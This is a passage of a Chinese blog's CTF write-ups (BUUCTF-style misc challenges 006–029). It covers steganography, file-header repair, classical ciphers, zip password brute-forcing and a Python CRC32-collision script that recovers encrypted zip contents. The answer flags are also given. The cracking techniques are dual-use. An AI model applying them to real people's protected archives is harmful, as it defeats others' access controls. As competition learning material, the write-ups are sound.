title="006.认真你就输了"></a>006.认真你就输了</h2><p>提示<code>The flag is under this nicely made chart.</code>???啥意思<br>记事本打开，艾，不行，直接改后缀名为.zip打开之后./xl/charts/目录下发现flag.txt文件。改后缀名是突然想到的，有次做一道java web + xxe的题目时用到的，太菜了。。。<br>flag.txt文件拉出来打开为<code>flag&#123;M9eVfi2Pcs#&#125;</code>，~估计还有啥加密，这肯定还不行。。。~沃日可以操就是flag。。。<br><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;M9eVfi2Pcs#&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h2 id="007-GXYCTF2019-佛系青年"><a href="#007-GXYCTF2019-佛系青年" class="headerlink" title="007.[GXYCTF2019]佛系青年"></a>007.[GXYCTF2019]佛系青年</h2><p>压缩包只能解压出来一个png图片，另一个文件需要密码，图片解压出来之后先r查看图片信息。什么都无，binwalk也没发现啥东西，stegsolve打开看看，啥都没发现，~沃日~伪加密。。。<br>09改00，~沃日~真佛洗。。。<br><pre class="line-numbers language-none"><code class="language-none">佛曰：遮等諳勝能礙皤藐哆娑梵迦侄羅哆迦梵者梵楞蘇涅侄室實真缽朋能。奢怛俱道怯都諳怖梵尼怯一罰心缽謹缽薩苦奢夢怯帝梵遠朋陀諳陀穆諳所呐知涅侄以薩怯想夷奢醯數羅怯諸<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>解一下密<br><pre class="line-numbers language-none"><code class="language-none">flag&#123;w0_fo_ci_Be1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>~日~</p><h2 id="008-穿越时空的思念"><a href="#008-穿越时空的思念" class="headerlink" title="008.穿越时空的思念"></a>008.穿越时空的思念</h2><p>题目描述:嫦娥当年奔月后，非常后悔，因为月宫太冷清，她想：早知道让后羿自己上来了，带了只兔子真是不理智。于是她就写了一首曲子，诉说的是怀念后羿在的日子。无数年后，小明听到了这首曲子，毅然决定冒充后羿。然而小明从曲子中听不出啥来，咋办。。（该题目为小写的32位字符，提交即可） 注意：得到的 flag 请包上 flag{} 提交</p><pre class="line-numbers language-none"><code class="language-none">1.下载下来的是一个音频文件，打开听一下有摩斯，用au打开双通道，分析下面的莫斯电码2.分了两段&lt;1&gt;: ..-.&#x2F;-----&#x2F;..---&#x2F;----.&#x2F;-...&#x2F;-..&#x2F;-....&#x2F;..-.&#x2F;.....&#x2F;.....&#x2F;.----&#x2F;.----&#x2F;...--&#x2F;----.&#x2F;.&#x2F;.&#x2F;-..&#x2F;.&#x2F;-...&#x2F;---..&#x2F;.&#x2F;....-&#x2F;.....&#x2F;.-&#x2F;.----&#x2F;--...&#x2F;.....&#x2F;-...&#x2F;-----&#x2F;--...&#x2F;---..&#x2F;-....&#x2F;&lt;2&gt;: ..-.&#x2F;-----&#x2F;..---&#x2F;----.&#x2F;-...&#x2F;-..&#x2F;-....&#x2F;..-.&#x2F;.....3.前一段:F029BD6F551139EEDEB8E45A175B0786   后一段:F029BD6F5，注意到后一段的值与前一段的前9个是相同的，所以猜测这后面的这段数据是冗余的。4.发现前一段正好是32为，md5解一下qerjlkjhbv5.提到兔子想到rabbit解密一下看看。~日，直接就是上面的md5小写我丢，这就是misc？~6.&gt;&gt;&gt; print(str.lower(&quot;F029BD6F551139EEDEB8E45A175B0786 &quot;))f029bd6f551139eedeb8e45a175b0786flag&#123;f029bd6f551139eedeb8e45a175b0786&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="009-BJDCTF2020-鸡你太美"><a href="#009-BJDCTF2020-鸡你太美" class="headerlink" title="009.[BJDCTF2020]鸡你太美"></a>009.[BJDCTF2020]鸡你太美</h2><pre class="line-numbers language-none"><code class="language-none">啊这。。。1.首先是两个文件，有个gif先用steg打开frame分析一下，没思路，看第二个gif，打不开，记事本打开发现9a，而gif文件头为GIF89a?，给她改回来再打开。少了前四位&#96;47 49 46 38&#96;加上即可。2.竖排的一个只因你太咩，复制一下。zhi-yin-you-are-beautiful3.flag&#123;zhi-yin-you-are-beautiful&#125;，~日，下划线不是横杠~4.flag&#123;zhi_yin_you_are_beautiful&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="010-BJDCTF-2nd-Real-EasyBaBa"><a href="#010-BJDCTF-2nd-Real-EasyBaBa" class="headerlink" title="010.[BJDCTF 2nd]Real_EasyBaBa"></a>010.[BJDCTF 2nd]Real_EasyBaBa</h2><pre class="line-numbers language-none"><code class="language-none">1.图片用记事本打开最后发现隐藏有其他的文件，用binwalk分离一下。2.dd if&#x3D;ezbb_r.png of&#x3D;1.zip bs&#x3D;1 skip&#x3D;28673   ##还是用dd命令分离一下吧3.粘贴到windows里面，日，还是不行，原来是没有文件头，那就打开winhex修改一下吧。4.加上文件头50 4B再binwalk。得到hint是个二维码，txt记事本打开缩小很多之后，用手机qq就能扫出来了，啥都不缺。5.扫出命令:od -vtx1 .&#x2F;ezbb_r.png | head -56 | tail -286.再kaili里面执行命令:od -vtx1 .&#x2F;ezbb_r.png | head -56 | tail -28得<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">0000700 01 00 02 10 03 10 00 00 01 ee c0 b8 a6 00 00 000000720 ff ff ff 00 ff ff ff ff 00 ff ff 00 00 00 ff ff0000740 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 000000760 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 000001000 ff ff 00 00 00 00 ff 00 00 ff 00 ff 00 ff 00 000001020 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 000001040 ff 00 ff 00 ff 00 ff 00 00 ff 00 ff 00 00 ff 000001060 ff ff ff 00 ff ff ff 00 00 ff ff 00 00 00 ff ff0001100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 000001120 ff ff ff 00 ff ff ff 00 ff ff ff 00 ff ff 00 000001140 ff 00 00 00 00 00 ff 00 00 00 ff 00 00 ff 00 000001160 ff ff ff 00 00 00 ff 00 ff ff ff 00 00 ff 00 000001200 00 00 ff 00 00 00 ff 00 ff 00 00 00 00 ff 00 000001220 ff ff ff 00 00 00 ff 00 ff ff ff 00 ff ff ff 000001240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 000001260 ff ff ff 00 ff 00 ff 00 ff ff ff 00 ff ff ff 000001300 ff 00 00 00 ff 00 ff 00 ff 00 ff 00 00 00 ff 000001320 ff ff ff 00 ff ff ff 00 ff ff ff 00 00 00 ff 000001340 00 00 ff 00 00 00 ff 00 00 00 ff 00 00 00 ff 000001360 ff ff ff 00 00 00 ff 00 ff ff ff 00 00 00 ff 000001400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 000001420 ff ff ff 00 ff ff 00 00 00 00 00 00 00 00 00 000001440 ff 00 00 00 00 ff 00 00 00 00 00 00 00 00 00 000001460 ff ff ff 00 00 ff 00 00 00 00 00 00 00 00 00 000001500 ff 00 ff 00 00 ff ff 00 00 00 00 00 00 00 00 000001520 ff 00 ff 00 00 ff 00 00 00 00 00 00 00 00 00 000001540 ff ff ff 00 00 ff 00 00 00 00 00 00 00 00 00 000001560 00 00 00 00 ff ff 00 63 da e9 3c 36 b1 aa 93 59<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>f高亮显示一下即得flag（notepad++支持这种操作，选中自动变绿。）</code><br><code>BID&#123;572154976&#125;</code><br><code>flag&#123;572154976&#125;</code></p><h2 id="011-GKCTF2020-Pokémon"><a href="#011-GKCTF2020-Pokémon" class="headerlink" title="011.[GKCTF2020]Pokémon"></a>011.[GKCTF2020]Pokémon</h2><p><code>Hint:Pokémon 说明是windows编码的，只是游戏简单操作说明 flag格式为flag&#123;flag_is_here&#125;,,,比赛累了吧,怀旧一把，我在103号道路等你</code></p><p>先下个游戏的运行环境，就是gba的类似启动器的一种东西。<br><pre class="line-numbers language-none"><code class="language-none">1.游戏放在桌面上用VisualBoyAdvance打开，开始玩，口袋怪兽绿宝石没玩过。。。2.根据在网上搜到的攻略玩，做完第一个任务一直向上走就能找到藏flag的地方了。3.flag&#123;PokEmon_14_CutE&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>~MISC真是啥都有~</p><h2 id="012-ACTF新生赛2020-outguess"><a href="#012-ACTF新生赛2020-outguess" class="headerlink" title="012.[ACTF新生赛2020]outguess"></a>012.[ACTF新生赛2020]outguess</h2><pre class="line-numbers language-none"><code class="language-none">1.有个mmm.jpg看详细信息&#96;公正民主公正文明公正和谐&#96;，社会主义核心价值观解密后为&#96;abc&#96;。2.outguess昨天刚用过，是个加密工具，还在kali上面，使用下面的命令解密。&#96;outguess -k &quot;abc&quot; -r mmm.jpg flag.txt&#96;3.ACTF&#123;gue33_Gu3Ss!2020&#125;4.flag&#123;gue33_Gu3Ss!2020&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="013-SWPU2019-我有一只马里奥"><a href="#013-SWPU2019-我有一只马里奥" class="headerlink" title="013.[SWPU2019]我有一只马里奥"></a>013.[SWPU2019]我有一只马里奥</h2><pre class="line-numbers language-none"><code class="language-none">1.exe文件点击运行之后出现了1.txt看里面的内容是ntfs，考虑ntfs文件隐写.2.就是后面有:flag.txt:$DATA的内容看不了，用工具打开之后就能看得到了。工具名:NtfsStreamsEditor3.swpuctf&#123;ddg_is_cute&#125;3.flag&#123;ddg_is_cute&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="014-谁赢了比赛？"><a href="#014-谁赢了比赛？" class="headerlink" title="014.谁赢了比赛？"></a>014.谁赢了比赛？</h2><pre class="line-numbers language-none"><code class="language-none">1.解压后是张图片，打开看看是棋谱？？？没啥用，binwalk分离出压缩包，有加密。2.爆破，wuwuwu，四位数字试一下(其实我是看wp是四位数字，这misc。。。)，用ARCHOPR爆。3.口令是1020，谁爆谁知道，打开一看有个gif，有个没用的txt提示，帧分离一下，共360帧，我是在网上下的软件进行分离的，不用点了。。。3.从0开始309帧明显有问题（有个do you know where is the flag），拖进stegsolve里面，red plane 0发现二维码，4.flag&#123;shanxiajingwu_won_the_game&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="015-Mysterious"><a href="#015-Mysterious" class="headerlink" title="015.Mysterious"></a>015.Mysterious</h2><p>逆向一下，拖进ida，首先看start函数，发现没什么发现之后查看字符串，发现well done样的字符串，分析关键反汇编代码也许就在这里，双击跳转到反汇编那里，审计一下c源码，知道想让我们输入的内容需要少于等于六个，然后下面还有条件:<br><pre class="line-numbers language-none"><code class="language-none">if ( v4 &#x3D;&#x3D; 122 &amp;&amp; String[3] &#x3D;&#x3D; &#39;x&#39; &amp;&amp; String[5] &#x3D;&#x3D; &#39;z&#39; &amp;&amp; String[4] &#x3D;&#x3D; &#39;y&#39; )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>这样才可以，然后v4的值类型为int，并且字符串的后面的连续的三位须是<code>xyz</code>，输入<code>122xyz</code>就能拿到flag了，上面还对这里的输入进行类型转换了，不过对大局影响不大。<br><code>flag&#123;123_Buff3r_0v3rf|0w&#125;</code>，逆向分析一下也可以得flag，挺简单的一道逆向题目吧。</p><h2 id="016-GXYCTF2019-gakki"><a href="#016-GXYCTF2019-gakki" class="headerlink" title="016.[GXYCTF2019]gakki"></a>016.[GXYCTF2019]gakki</h2><p>解压出图片，分离出压缩包，爆破出密码8864，用新学到的jieba库做个脚本<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-#</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># Name:         6.6.py</span><span class="token comment"># Description:</span><span class="token comment"># Author:       M4XLMUM</span><span class="token comment"># Date:         2020/12/22</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token keyword">import</span> jiebatxt <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>words <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>txt<span class="token punctuation">)</span>counts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> word <span class="token keyword">in</span> words<span class="token punctuation">:</span>    counts<span class="token punctuation">[</span>word<span class="token punctuation">]</span> <span class="token operator">=</span> counts<span class="token punctuation">.</span>get<span class="token punctuation">(</span>word<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>items <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>counts<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>items<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    word<span class="token punctuation">,</span> count <span class="token operator">=</span> items<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>word<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>得flag<code>GXY&#123;gaki_IsMyw1fe&#125;</code>,<code>flag&#123;gaki_IsMyw1fe&#125;</code></p><h2 id="017-HBNIS2018-excel破解"><a href="#017-HBNIS2018-excel破解" class="headerlink" title="017.[HBNIS2018]excel破解"></a>017.[HBNIS2018]excel破解</h2><p>直接用HXD打开全局搜索一下flag，找到flag is here字样，定位到该位置发现flag<code>CTF&#123;office_easy_cracked&#125;</code><br><code>flag&#123;office_easy_cracked&#125;</code></p><h2 id="018-HBNIS2018-来题中等的吧"><a href="#018-HBNIS2018-来题中等的吧" class="headerlink" title="018.[HBNIS2018]来题中等的吧"></a>018.[HBNIS2018]来题中等的吧</h2><p>给的是一张图片，像是摩斯，先不管先binwalk没啥发现。<br>转成摩斯<code>.-/.-../.--./..../.-/.-../.-/-...</code>解密为<code>ALPHALAB</code>没了，<code>flag&#123;alphalab&#125;</code></p><h2 id="019-SWPU2019-伟大的侦探"><a href="#019-SWPU2019-伟大的侦探" class="headerlink" title="019.[SWPU2019]伟大的侦探"></a>019.[SWPU2019]伟大的侦探</h2><p>010editor使用EBCDIC打开，然后获得密码<code>wllm_is_the_best_team!</code>，解压后是跳舞的小人密码<br>懒得解码了没啥用<code>iloveholmesandwllm</code><br><code>flag&#123;iloveholmesandwllm&#125;</code></p><h2 id="020-黑客帝国"><a href="#020-黑客帝国" class="headerlink" title="020.黑客帝国"></a>020.黑客帝国</h2><pre class="line-numbers language-none"><code class="language-none">Jack很喜欢看黑客帝国电影，一天他正在上网时突然发现屏幕不受控制，出现了很多数据再滚屏，结束后留下了一份神秘的数据文件，难道这是另一个世界给Jack留下的信息？聪明的你能帮Jack破解这份数据的意义吗？ 注意：得到的 flag 请包上 flag&#123;&#125; 提交<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>十六进制数据，hex恢复一下源文件为<code>1.rar</code>有密码，爆破得密码3690解压得图片png图片显示格式错误打不开，winhex打开图片，文件有jfif该是jpg，但是文件头却改成了png的文件头，改回<code>FF D8 FF 00</code>后缀名改为<code>.jpg</code>即可获得图片，图片上有flag。<code>flag&#123;57cd4cfd4e07505b98048ca106132125&#125;</code></p><blockquote><p>下面总结一些常见的文件的文件头</p></blockquote><pre class="line-numbers language-常见文件的文件头" data-language="常见文件的文件头"><code class="language-常见文件的文件头">JPEG (jpg)，文件头：FFD8FF PNG (png)，文件头：89504E47 GIF (gif)，文件头：47494638 TIFF (tif)，文件头：49492A00 Windows Bitmap (bmp)，文件头：424D CAD (dwg)，文件头：41433130 Adobe Photoshop (psd)，文件头：38425053 Rich Text Format (rtf)，文件头：7B5C727466 XML (xml)，文件头：3C3F786D6C HTML (html)，文件头：68746D6C3E Email [thorough only] (eml)，文件头：44656C69766572792D646174653A Outlook Express (dbx)，文件头：CFAD12FEC5FD746F Outlook (pst)，文件头：2142444E MS Word&#x2F;Excel (xls.or.doc)，文件头：D0CF11E0 MS Access (mdb)，文件头：5374616E64617264204A WordPerfect (wpd)，文件头：FF575043 Postscript (eps.or.ps)，文件头：252150532D41646F6265 Adobe Acrobat (pdf)，文件头：255044462D312E Quicken (qdf)，文件头：AC9EBD8F Windows Password (pwl)，文件头：E3828596 ZIP Archive (zip)，文件头：504B0304 RAR Archive (rar)，文件头：52617221 Wave (wav)，文件头：57415645 AVI (avi)，文件头：41564920 Real Audio (ram)，文件头：2E7261FD Real Media (rm)，文件头：2E524D46 MPEG (mpg)，文件头：000001BA MPEG (mpg)，文件头：000001B3 Quicktime (mov)，文件头：6D6F6F76 Windows Media (asf)，文件头：3026B2758E66CF11 MIDI (mid)，文件头：4D546864<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="021-WUSTCTF2020-find-me"><a href="#021-WUSTCTF2020-find-me" class="headerlink" title="021.[WUSTCTF2020]find_me"></a>021.[WUSTCTF2020]find_me</h2><p>属性》详细信息》备注》发现盲文密码<br><pre class="line-numbers language-none"><code class="language-none">⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>解密，<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">解密网站</a><br><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">wctf2020&#123;y$0$u_f$1$n$d$_M$e$e$e$e$e&#125;flag&#123;y$0$u_f$1$n$d$_M$e$e$e$e$e&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h2 id="022-弱口令"><a href="#022-弱口令" class="headerlink" title="022.弱口令"></a>022.弱口令</h2><p>用360zip打开有预览，预览里面看有内容，复制出来到记事本，用sublim打开之后能看到摩斯密码<br><pre class="line-numbers language-none"><code class="language-none">....&#x2F;.&#x2F;.-..&#x2F;.-..&#x2F;-----&#x2F;..-.&#x2F;---&#x2F;.-.&#x2F;..-&#x2F;--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>解密后的内容为<code>HELL0FORUM</code>即是密码，用ziperello那个程序估计要多少天或者多少个月呜呜，弱密码啥时候到十位了呜呜。<br>解压后是一张图片，看wp是lsb隐写，有专门的软件。<br><a href="https://github.com/livz/cloacked-pixel">lsb隐写-python2环境</a><br>稍微配置一下环境，运行后得flag<br><code>flag&#123;jsy09-wytg5-wius8&#125;</code></p><h2 id="023-MRCTF2020-你能看懂音符吗"><a href="#023-MRCTF2020-你能看懂音符吗" class="headerlink" title="023.[MRCTF2020]你能看懂音符吗"></a>023.[MRCTF2020]你能看懂音符吗</h2><p>记事本打开发现文件头错了改回文件头，rar文件的文件头为<code>52 61 72 21</code>，用winhex打开文件改下文件头，52 61调下位置即可。<br>解压出word文件打开，word隐藏文字复制不出来，选中不能复制的部分ctrl+f然后复制就行了。<br><pre class="line-numbers language-none"><code class="language-none">♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§&#x3D;这都让你发现了，可是你能看懂吗？<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">音符解密</a><br><pre class="line-numbers language-none"><code class="language-none">♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">MRCTF&#123;thEse_n0tes_ArE_am@zing~&#125;flag&#123;thEse_n0tes_ArE_am@zing~&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h2 id="024-john-in-the-middle"><a href="#024-john-in-the-middle" class="headerlink" title="024.john-in-the-middle"></a>024.john-in-the-middle</h2><p>是个流量包，用wireshark打开之后注意到有不少http流量，导出http对象，批量save all即可，<br>导出的东西重要看那几张图片，注意到scanline那张图片里面gba三通道里面都有一条特殊的线，而logo图片也有问题，然后用stegsolve的combiner功能整一下，sub模式下发现flag<br><pre class="line-numbers language-none"><code class="language-none">flag&#123;J0hn_th3_Sn1ff3r&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h2 id="025-zip"><a href="#025-zip" class="headerlink" title="025.zip"></a>025.zip</h2><p>压缩包里的txt文件太小了，考虑crc碰撞，下面是crc的脚本<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> string<span class="token keyword">import</span> binascii<span class="token keyword">def</span> <span class="token function">CrackCrc</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span>         <span class="token keyword">for</span> j <span class="token keyword">in</span> dic<span class="token punctuation">:</span>            <span class="token keyword">for</span> k <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                <span class="token keyword">for</span> h <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                    s <span class="token operator">=</span> i <span class="token operator">+</span> j <span class="token operator">+</span> k <span class="token operator">+</span> h                    <span class="token keyword">if</span> crc <span class="token operator">==</span> <span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">)</span>                        <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">CrackZip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">'out'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.zip'</span>            crc <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getinfo<span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>CRC            CrackCrc<span class="token punctuation">(</span>crc<span class="token punctuation">)</span>dic <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'+/='</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>CrackZip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"CRC32碰撞完成"</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>放到pycharm里面可正常运行，pycharm，pyide的神，芜湖。解出来的字符串像是一段base64<br><pre class="line-numbers language-none"><code class="language-none">z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>直接把txt文件用notepad++打开之后选中全部插件base64 decoder就好了(别忘了ctrl s)，后改文件为rar，用winhex打开<br><pre class="line-numbers language-none"><code class="language-none">rar文件的尾部为C4 3D 7B 00 40 07 00rar文件的头部数据为52 61 72 21 1A 07 00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>将rar的头部数据粘贴进去即可修复压缩包获得flag<br><pre class="line-numbers language-none"><code class="language-none">flag&#123;nev3r_enc0de_t00_sm4ll_fil3_w1th_zip&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h2 id="026-GUET-CTF2019-KO"><a href="#026-GUET-CTF2019-KO" class="headerlink" title="026.[GUET-CTF2019]KO"></a>026.[GUET-CTF2019]KO</h2><p>进去就是老ook编码了，得flag，<code>welcome to CTF</code>，故flag为<code>flag&#123;welcome to CTF&#125;</code></p><p><a href="https://www.splitbrain.org/services/ook">Ook!在线工具网址</a></p><h2 id="027-HBNIS2018-caesar"><a href="#027-HBNIS2018-caesar" class="headerlink" title="027.[HBNIS2018]caesar"></a>027.[HBNIS2018]caesar</h2><p>凯撒密码，偏移量为25或者1，flag为<code>flag&#123;flagiscaesar&#125;</code></p><h2 id="028-SWPU2019-你有没有好好看网课"><a href="#028-SWPU2019-你有没有好好看网课" class="headerlink" title="028.[SWPU2019]你有没有好好看网课"></a>028.[SWPU2019]你有没有好好看网课</h2><p>有个压缩包flag3zip提示是六位数字，爆破出密码为<code>183792</code>秒出可太秀了，用时0秒zipere永远滴神。大约是几毫秒。<br>docx发现提示520与提示711，pr打开进入520时发现类似莫斯的东西，711处发现base64，分别如下<br><pre class="line-numbers language-none"><code class="language-none">..... ..&#x2F;... .&#x2F;... .&#x2F;... ..&#x2F;dXBfdXBfdXA&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>第一个是敲击码，第二个是base64，用python也可解<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> base64<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"dXBfdXBfdXA="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">b'up_up_up'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><p>敲击码解<br><pre class="line-numbers language-none"><code class="language-none">..... ..&#x2F;... .&#x2F;... .&#x2F;... ..&#x2F;5,2&#x2F;3,1&#x2F;3,1&#x2F;3,2&#x2F;    手解即可，先横后竖。0   1   2   3   4   51   A   B  C&#x2F;K  D   E2   F   G   H   I   J3   L   M   N   O   P4   Q   R   S   T   U5   V   W   X   Y   Z<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>WLLM<br>故可得flag2压缩包的密码为<code>wllmup_up_up</code><br>图片用winhex打开ascii部分发现flag<br><code>swpuctf&#123;A2e_Y0u_Ok?&#125;</code><br><code>flag&#123;A2e_Y0u_Ok?&#125;</code></p><h2 id="029-MRCTF2020-ezmisc"><a href="#029-MRCTF2020-ezmisc" class="headerlink" 